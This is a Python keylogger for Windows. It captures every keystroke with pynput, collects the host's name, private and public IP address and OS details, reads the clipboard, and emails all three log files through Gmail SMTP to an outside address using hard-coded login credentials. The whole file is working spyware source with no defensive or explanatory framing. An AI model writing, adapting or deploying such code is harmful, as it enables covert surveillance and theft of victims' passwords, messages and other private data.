from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os

import getpass
from requests import get

log = 'log.txt'
path ='E:\\Python Keylogger\\Test'
extend='\\'
toaddr = "xxxxxx@gmail.com"
keys_information = "log.txt"
sysinfo='Sysinfo.txt'
clipboard='clipboard.txt'
files=[keys_information,sysinfo,clipboard]
print('Running\n')


def sys():
    with open(path + extend + sysinfo, 'a') as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip +'\n')

            except Exception:
                f.write("Couldn't get Public IP Address (most likely max query"+'\n')

            f.write("Processor: " + (platform.processor()) + '\n')
            f.write("System: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("Private IP Address: " + IPAddr + "\n")


def send_email(filename, attachment, toaddr):

    fromaddr = 'testmailk1ng1@gmail.com'
    toaddr = 'aadiinsta12@gmail.com'

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Key_LOGs"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()
    smtplib.UseDefaultCredentials = False;
    smtplib.EnableSsl = True;

    s.login('zzzzzzzz@gmail.com', 'pwdpwdpwdpwdpwd')

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)
    print("\nSent")

    s.quit()



def clip():
    with open(path+extend+clipboard,'a') as f:
        try:
            win32clipboard.OpenClipboard()
            data=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard:\n"+data)
        except:
            f.write("Clipboard can be copied")



def on_press(key):
    keys = []
    keys.append(key)
    write_file(keys)

    # try:
    #     print(format(key.char))
    #
    # except AttributeError:
    #     print(format(key))


def write_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")

            if k.find("space") > 0:
                 f.write(' ')
                 f.close()
            elif k.find("Key") == -1:
                 f.write(k)
                 f.close()
            elif k.find("enter")>0:
                 f.write('\n')
                 f.close()
            else:
                f.write(k)




def on_release(key):
       if key == Key.esc:
        # Stop listener
            with open('log.txt', 'a') as f:
             f.write('\n--------------------------------------------\n')
        #print(keys)
             return False


with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
    sys()
    clip()
    send_email(keys_information, path + extend + keys_information, toaddr)
    send_email(sysinfo, path + extend + sysinfo, toaddr)
    send_email(clipboard, path + extend + clipboard, toaddr)


